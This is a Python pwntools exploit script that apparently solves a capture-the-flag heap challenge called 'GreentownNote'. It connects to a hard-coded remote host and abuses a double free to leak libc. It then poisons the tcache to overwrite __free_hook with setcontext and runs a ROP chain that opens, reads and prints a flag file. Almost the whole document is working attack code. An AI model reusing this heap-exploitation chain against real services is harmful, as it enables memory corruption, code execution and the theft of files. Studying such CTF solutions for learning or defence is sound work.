# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './GreentownNote'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '82.157.5.28'
    port = '52201'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , content = 'a'):
    cmd(1)
    sla('size :' , size)
    sla('Content :' ,content )

def delete(idx):
    cmd(3)
    sla('Index :' , idx)

def show(idx):
    cmd(2)
    sla('Index :' , idx)

# one_gad = one_gadget(libc.path)

add(0x100)
add(0x100)
add(0x80)

for i in range(7):
    delete(0)

delete(1)
show(1)

leak = l64() - 0x70
libc.address = leak - libc.sym['__malloc_hook']

__free_hook = libc.sym['__free_hook']
setcontext = libc.sym['setcontext'] + 53

read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
ret = libc.search(asm(' ret')).next()
pop_rax_ret = libc.search(asm('pop rax; ret')).next()
pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()

flag_addr = __free_hook  + 0x100 + 0xd0
chian = flat(
    pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
    pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
    pop_rdi_ret , flag_addr , puts_addr
).ljust(0xd0,'\x00') + 'flag\x00'

lg('__free_hook',__free_hook)


add(0x200)
delete(0)
delete(0)

payload = flat(
    setcontext , '\x00'*0x98,
    __free_hook + 0x100 , ret 
)
payload = payload.ljust(0x100 ,'\x00') + chian

add(0x200 , p64(__free_hook))
add(0x200)
add(0x200 , payload)

delete(3)

# dbg()


p.interactive()

'''
@File    :   GreentownNote.py
@Time    :   2021/09/29 12:05:12
@Author  :   Niyah 
'''